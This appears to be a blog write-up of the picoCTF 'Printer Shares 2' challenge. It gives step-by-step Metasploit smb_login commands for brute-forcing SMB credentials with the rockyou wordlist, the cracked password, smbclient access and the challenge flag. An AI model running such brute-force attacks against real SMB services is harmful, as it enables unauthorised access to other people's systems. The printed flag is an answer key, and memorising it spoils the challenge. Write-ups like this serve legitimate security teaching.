# PicoCTF Writeup - General Skills: Printer Shares 2



{{< admonition tldr "TL;DR" >}}

**picoCTF Writeup - General Skills: Printer Shares 2** is a misc challenge from **picoCTF**. ---

{{< /admonition >}}

## Description
In this challenge, we are given access to a remote SMB service.  
The objective is to obtain valid credentials, access the SMB share, and retrieve the flag stored on the server.

---

# Reconnaissance

To obtain valid credentials, we performed a brute-force attack against the SMB service using Metasploit.

First, start Metasploit:

```bash
msfconsole
```

Load the SMB login brute-force module:

```bash
use auxiliary/scanner/smb/smb_login
```

Configure the target parameters:

```bash
set RHOSTS 3.18.205.4
set RPORT 51034
set SMBUser joe
set PASS_FILE /usr/share/wordlists/rockyou.txt
```

Run the module:

```bash
run
```

Metasploit successfully discovers valid credentials:

```
[+] 3.18.205.4:51034 - Success: '.\joe:popcorn'
```

Discovered credentials:

```
Username: joe
Password: popcorn
```

---

# Exploitation

After obtaining the credentials, we can access the SMB share using `smbclient` .

```bash
smbclient //green-hill.picoctf.net/secure-shares -p 63828 -U joe
```

Enter the password when prompted:

```
popcorn
```

After logging in, list the available files:

```bash
ls
```

Output:

```
flag.txt
```

---

# Retrieving the Flag

Download the flag file from the share:

```bash
get flag.txt
```

Then read the contents of the file:

```bash
cat flag.txt
```

---

# Flags

```
picoCTF{5mb_pr1nter_5h4re5_5ecure_5e30b668}
```

---

# Conclusion

This challenge demonstrates how weak credentials on an SMB service can be exploited through brute-force attacks.  
By discovering valid credentials, we were able to authenticate to the SMB share and retrieve the flag.

Tools used in this challenge:

- Metasploit
- smbclient
- rockyou.txt wordlist


---

> Author: [spawn2pwn](https://github.com/nfl-alvis)  
> URL: https://ctf.spawn2pwn.my.id/posts/printer-shares-2/  

